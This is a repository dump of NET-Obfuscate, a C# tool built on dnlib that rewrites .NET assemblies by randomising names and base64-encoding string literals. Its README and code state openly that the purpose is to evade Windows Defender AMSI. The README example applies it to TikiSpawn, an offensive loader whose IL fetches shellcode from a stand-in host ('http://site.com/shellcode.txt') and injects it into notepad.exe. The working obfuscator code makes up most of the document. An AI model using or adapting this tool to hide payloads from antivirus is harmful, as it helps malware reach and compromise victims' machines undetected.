@@ -1,0 +1,560 @@
+Directory structure:
+└── binaryscary-net-obfuscate/
+    ├── README.md
+    ├── NET-Obfuscate.sln
+    └── NET-Obfuscate/
+        ├── App.config
+        ├── NET-Obfuscate.csproj
+        ├── Program.cs
+        ├── packages.config
+        └── Properties/
+            └── AssemblyInfo.cs
+
+================================================
+File: README.md
+================================================
+# NET-Obfuscate
+Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI.
+```
+PS C:\Users\User\Source\Repos\NET-Obfuscate\NET-Obfuscate\bin\x64\Release> .\NET-Obfuscate.exe -h                       Usage:
+  NET-Obfuscate [options]
+
+Options:
+  --in-file <in-file>      The .Net assembly path you want to obfuscate
+  --out-file <out-file>    Path to the newly obfuscated file, default is "inFile".obfuscated
+  --version                Show version information
+  -?, -h, --help           Show help and usage information
+```
+
+## TikiSpawn Example(IL):
+*Before:*
+```
+.class public auto ansi beforefieldinit TikiSpawn
+	extends [mscorlib]System.Object
+{
+	.custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = (
+		01 00 01 00 00
+	)
+	// Methods
+	// Token: 0x06000002 RID: 2 RVA: 0x0000204F File Offset: 0x0000024F
+	.method public hidebysig specialname rtspecialname 
+		instance void .ctor () cil managed 
+	{
+		// Header Size: 1 byte
+		// Code Size: 23 (0x17) bytes
+		.maxstack 8
+
+		/* (13,5)-(13,23) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
+		/* 0x00000250 02           */ IL_0000: ldarg.0
+		/* 0x00000251 280100000A   */ IL_0001: call      instance void [mscorlib]System.Object::.ctor()
+		/* (15,9)-(15,82) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
+		/* 0x00000256 02           */ IL_0006: ldarg.0
+		/* 0x00000257 7201000070   */ IL_0007: ldstr     "c:\\windows\\notepad.exe"
+		/* 0x0000025C 722F000070   */ IL_000C: ldstr     "http://site.com/shellcode.txt"
+		/* 0x00000261 2806000006   */ IL_0011: call      instance void TikiSpawn::Flame(string, string)
+		/* (16,5)-(16,6) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
+		/* 0x00000266 2A           */ IL_0016: ret
+	} // end of method TikiSpawn::.ctor
+```
+*After:*
+```
+.class public auto ansi beforefieldinit EVMR2Y8ZMC.JPEQYLSVTO
+	extends [mscorlib]System.Object
+{
+	.custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = (
+		01 00 01 00 00
+	)
+	// Methods
+	// Token: 0x06000002 RID: 2 RVA: 0x0000204F File Offset: 0x0000024F
+	.method public hidebysig specialname rtspecialname 
+		instance void .ctor () cil managed 
+	{
+		// Header Size: 1 byte
+		// Code Size: 55 (0x37) bytes
+		.maxstack 8
+
+		/* 0x00000250 02           */ IL_0000: ldarg.0
+		/* 0x00000251 281000000A   */ IL_0001: call      instance void [mscorlib]System.Object::.ctor()
+		/* 0x00000256 02           */ IL_0006: ldarg.0
+		/* 0x00000257 00           */ IL_0007: nop
+		/* 0x00000258 281100000A   */ IL_0008: call      class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
+		/* 0x0000025D 7201000070   */ IL_000D: ldstr     "Yzpcd2luZG93c1xub3RlcGFkLmV4ZQ=="
+		/* 0x00000262 281200000A   */ IL_0012: call      uint8[] [mscorlib]System.Convert::FromBase64String(string)
+		/* 0x00000267 6F1300000A   */ IL_0017: callvirt  instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
+		/* 0x0000026C 00           */ IL_001C: nop
+		/* 0x0000026D 281100000A   */ IL_001D: call      class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
+		/* 0x00000272 7243000070   */ IL_0022: ldstr     "asRsdcDsdvsdzEsdi4xNjzuNzI5MTY2g3NoxsY2asdf9sdZsd50eHQ="
+		/* 0x00000277 281200000A   */ IL_0027: call      uint8[] [mscorlib]System.Convert::FromBase64String(string)
+		/* 0x0000027C 6F1300000A   */ IL_002C: callvirt  instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
+		/* 0x00000281 2806000006   */ IL_0031: call      instance void EVMR2Y8ZMC.JPEQYLSVTO::'40W6NX6Z4J'(string, string)
+		/* 0x00000286 2A           */ IL_0036: ret
+	} // end of method JPEQYLSVTO::.ctor
+```
+
+
+
+================================================
+File: NET-Obfuscate.sln
+================================================
+ï»¿
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 16
+VisualStudioVersion = 16.0.29911.84
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "NET-Obfuscate", "NET-Obfuscate\NET-Obfuscate.csproj", "{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|x64 = Debug|x64
+		Release|x64 = Release|x64
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}.Debug|x64.ActiveCfg = Debug|x64
+		{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}.Debug|x64.Build.0 = Debug|x64
+		{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}.Release|x64.ActiveCfg = Release|x64
+		{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}.Release|x64.Build.0 = Release|x64
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {991856E7-3C25-4270-A069-B87CD14738B5}
+	EndGlobalSection
+EndGlobal
+
+
+
+================================================
+File: NET-Obfuscate/App.config
+================================================
+ï»¿<?xml version="1.0" encoding="utf-8" ?>
+<configuration>
+    <startup> 
+        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
+    </startup>
+</configuration>
+
+
+================================================
+File: NET-Obfuscate/NET-Obfuscate.csproj
+================================================
+ï»¿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.props" Condition="Exists('..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{E67E7D23-2DF7-47A5-84E7-A7853C4F3B9B}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>NET_Obfuscate</RootNamespace>
+    <AssemblyName>NET-Obfuscate</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x64\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <OutputPath>bin\x64\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <Prefer32Bit>true</Prefer32Bit>
+    <DocumentationFile>bin\x64\Release\NET-Obfuscate.xml</DocumentationFile>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="dnlib, Version=3.3.2.0, Culture=neutral, PublicKeyToken=50e96378b6e77999, processorArchitecture=MSIL">
+      <HintPath>..\packages\dnlib.3.3.2\lib\net45\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Buffers, Version=4.0.2.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.4.0\lib\netstandard2.0\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.CommandLine, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.CommandLine.2.0.0-beta1.20214.1\lib\netstandard2.0\System.CommandLine.dll</HintPath>
+    </Reference>
+    <Reference Include="System.CommandLine.DragonFruit, Version=0.3.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\lib\netstandard2.0\System.CommandLine.DragonFruit.dll</HintPath>
+    </Reference>
+    <Reference Include="System.CommandLine.Rendering, Version=0.3.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.CommandLine.Rendering.0.3.0-alpha.20214.1\lib\netstandard2.0\System.CommandLine.Rendering.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Memory, Version=4.0.1.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Memory.4.5.3\lib\netstandard2.0\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.3.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.4.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.4.5.2\lib\netstandard2.0\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+    <None Include="packages.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.7.2">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4.7.2 %28x86 and x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.props'))" />
+    <Error Condition="!Exists('..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.targets'))" />
+  </Target>
+  <Import Project="..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.targets" Condition="Exists('..\packages\System.CommandLine.DragonFruit.0.3.0-alpha.20214.1\build\netstandard2.0\System.CommandLine.DragonFruit.targets')" />
+</Project>
+
+
+================================================
+File: NET-Obfuscate/Program.cs
+================================================
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using System.CommandLine;
+using System.CommandLine.DragonFruit;
+
+using dnlib.DotNet;
+using dnlib.DotNet.Emit;
+
+namespace Obfuscate
+{
+    class Obfuscate
+    {
+        private static Random random = new Random();
+        private static List<String> names = new List<string>();
+        // Reference: https://stackoverflow.com/a/1344242/11567632
+        public static string random_string(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            string name = "";
+            do {
+                name = new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
+            } while (names.Contains(name));
+
+            return name;
+        }
+
+        /// <summary>
+        /// fixes discrepancies in IL such as maxstack errors that occur due to instruction insertion
+        /// </summary>
+        public static void clean_asm(ModuleDef md)
+        {
+            foreach (var type in md.GetTypes())
+            {
+                foreach (MethodDef method in type.Methods)
+                {
+                    // empty method check
+                    if (!method.HasBody) continue;
+
+                    method.Body.SimplifyBranches();
+                    method.Body.OptimizeBranches(); // negates simplifyBranches
+                    //method.Body.OptimizeMacros();
+                }
+            }
+        }
+
+        // reference: https://github.com/CodeOfDark/Tutorials-StringEncryption
+        public static void obfuscate_strings(ModuleDef md)
+        {
+            //foreach (var type in md.Types) // only gets parent(non-nested) classes
+
+            // types(namespace.class) in module
+            foreach (var type in md.GetTypes())
+            {
+                // methods in type
+                foreach(MethodDef method in type.Methods)
+                {
+                    // empty method check
+                    if (!method.HasBody) continue;
+                    // iterate over instructions of method
+                    for(int i = 0; i < method.Body.Instructions.Count(); i++)
+                    {
+                        // check for LoadString opcode
+                        // CIL is Stackbased (data is pushed on stack rather than register)
+                        // ref: https://en.wikipedia.org/wiki/Common_Intermediate_Language
+                        // ld = load (push onto stack), st = store (store into variable)
+                        if(method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
+                        {
+                            // c# variable has for loop scope only
+                            String regString = method.Body.Instructions[i].Operand.ToString();
+                            String encString = Convert.ToBase64String(UTF8Encoding.UTF8.GetBytes(regString));
+                            Console.WriteLine($"{regString} -> {encString}");
+                            // methodology for adding code: write it in plain c#, compile, then view IL in dnspy
+                            method.Body.Instructions[i].OpCode = OpCodes.Nop; // errors occur if instruction not replaced with Nop
+                            method.Body.Instructions.Insert(i + 1,new Instruction(OpCodes.Call, md.Import(typeof(System.Text.Encoding).GetMethod("get_UTF8", new Type[] { })))); // Load string onto stack
+                            method.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, encString)); // Load string onto stack
+                            method.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, md.Import(typeof(System.Convert).GetMethod("FromBase64String", new Type[] { typeof(string) })))); // call method FromBase64String with string parameter loaded from stack, returned value will be loaded onto stack
+                            method.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, md.Import(typeof(System.Text.Encoding).GetMethod("GetString", new Type[] { typeof(byte[]) })))); // call method GetString with bytes parameter loaded from stack 
+                            i += 4; //skip the Instructions as to not recurse on them
+                        }
+                    }
+                    //method.Body.KeepOldMaxStack = true;
+                }
+            }
+
+        }
+
+        public static void obfuscate_methods(ModuleDef md)
+        {
+            foreach (var type in md.GetTypes())
+            {
+                // create method to obfuscation map
+                foreach (MethodDef method in type.Methods)
+                {
+                    // empty method check
+                    if (!method.HasBody) continue;
+                    // method is a constructor
+                    if (method.IsConstructor) continue;
+                    // method overrides another
+                    if (method.HasOverrides) continue;
+                    // method has a rtspecialname, VES needs proper name
+                    if (method.IsRuntimeSpecialName) continue;
+                    // method foward declaration
+                    if (method.DeclaringType.IsForwarder) continue;
+
+                    string encName = random_string(10);
+                    Console.WriteLine($"{method.Name} -> {encName}");
+                    method.Name = encName;
+                }
+            }
+        }
+
+        public static void obfuscate_resources(ModuleDef md, String name, String encName)
+        {
+            if (name == "") return;
+            foreach (var resouce in md.Resources)
+            {
+                String newName = resouce.Name.Replace(name, encName);
+                if(resouce.Name != newName)Console.WriteLine($"{resouce.Name} -> {newName}");
+                resouce.Name = newName;
+            }
+        }
+
+        public static void obfuscate_classes(ModuleDef md)
+        {
+            foreach (var type in md.GetTypes())
+            {
+                string encName = random_string(10);
+                Console.WriteLine($"{type.Name} -> {encName}");
+                obfuscate_resources(md, type.Name, encName);
+                type.Name = encName;
+            }
+
+        }
+
+        public static void obfuscate_namespace(ModuleDef md)
+        {
+            foreach (var type in md.GetTypes())
+            {
+                string encName = random_string(10);
+                Console.WriteLine($"{type.Namespace} -> {encName}");
+                obfuscate_resources(md, type.Namespace, encName);
+                type.Namespace = encName;
+            }
+
+        }
+
+        public static void obfuscate_assembly_info(ModuleDef md)
+        {
+            // obfuscate assembly name
+            string encName = random_string(10);
+            Console.WriteLine($"{md.Assembly.Name} -> {encName}");
+            md.Assembly.Name = encName;
+
+            // obfuscate Assembly Attributes(AssemblyInfo) .rc file
+            string[] attri = { "AssemblyDescriptionAttribute", "AssemblyTitleAttribute", "AssemblyProductAttribute", "AssemblyCopyrightAttribute", "AssemblyCompanyAttribute","AssemblyFileVersionAttribute"};
+            // "GuidAttribute", and assembly version can also be changed
+            foreach (CustomAttribute attribute in md.Assembly.CustomAttributes) {
+                if (attri.Any(attribute.AttributeType.Name.Contains)) {
+                    string encAttri = random_string(10);
+                    Console.WriteLine($"{attribute.AttributeType.Name} = {encAttri}");
+                    attribute.ConstructorArguments[0] = new CAArgument(md.CorLibTypes.String, new UTF8String(encAttri));
+                }
+            }
+        }
+
+        /// <summary>
+        /// Obfuscate ECMA CIL (.NET IL) assemblies by obfuscating names of methods, classes, namespaces, assemblyInfo and encoding strings
+        /// </summary>
+        /// <param name="inFile">The .Net assembly path you want to obfuscate</param>
+        /// <param name="outFile">Path to the newly obfuscated file, default is "inFile".obfuscated</param>
+        static void obfuscate(string inFile, string outFile)
+        {
+            if (inFile == "" || outFile == "") return;
+
+            string pathExec = inFile;
+
+            // cecil moduel ref(similar to dnlib): https://www.mono-project.com/docs/tools+libraries/libraries/Mono.Cecil/faq/
+            // load ECMA CIL (.NET IL)
+            ModuleDef md = ModuleDefMD.Load(pathExec);
+            md.Name = random_string(10);
+
+            obfuscate_strings(md);
+            obfuscate_methods(md);
+            obfuscate_classes(md);
+            obfuscate_namespace(md);
+            obfuscate_assembly_info(md);
+            //obfuscateVariables(md); // md.Write already simplifies variable names to there type in effect mangling them i.e: aesSetup -> aes1, aesRun -> aes2
+            //obfuscateComments(md); // comments are stripped during compile opitmization
+
+            clean_asm(md);
+
+            md.Write(outFile);
+        }
+
+        /// <summary>
+        /// Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI 
+        /// </summary>
+        /// <param name="inFile">The .Net assembly path you want to obfuscate</param>
+        /// <param name="outFile">Path to the newly obfuscated file, default is "inFile".obfuscated</param>
+        static void Main(string inFile = @"", string outFile = @"")
+        {
+            if(outFile == "")
+            {
+                outFile = inFile + ".Obfuscated";
+            }
+            obfuscate(inFile,outFile);
+        }
+    }
+}
+
+
+
+================================================
+File: NET-Obfuscate/packages.config
+================================================
+ï»¿<?xml version="1.0" encoding="utf-8"?>
+<packages>
+  <package id="dnlib" version="3.3.2" targetFramework="net472" />
+  <package id="Microsoft.CSharp" version="4.4.1" targetFramework="net472" />
+  <package id="System.Buffers" version="4.4.0" targetFramework="net472" />
+  <package id="System.CommandLine" version="2.0.0-beta1.20214.1" targetFramework="net472" />
+  <package id="System.CommandLine.DragonFruit" version="0.3.0-alpha.20214.1" targetFramework="net472" />
+  <package id="System.CommandLine.Rendering" version="0.3.0-alpha.20214.1" targetFramework="net472" />
+  <package id="System.Memory" version="4.5.3" targetFramework="net472" />
+  <package id="System.Numerics.Vectors" version="4.4.0" targetFramework="net472" />
+  <package id="System.Runtime.CompilerServices.Unsafe" version="4.5.2" targetFramework="net472" />
+</packages>
+
+
+================================================
+File: NET-Obfuscate/Properties/AssemblyInfo.cs
+================================================
+ï»¿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("NET-Obfuscate")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("NET-Obfuscate")]
+[assembly: AssemblyCopyright("Copyright Â©  2020")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible
+// to COM components.  If you need to access a type in this assembly from
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("e67e7d23-2df7-47a5-84e7-a7853c4f3b9b")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+
+
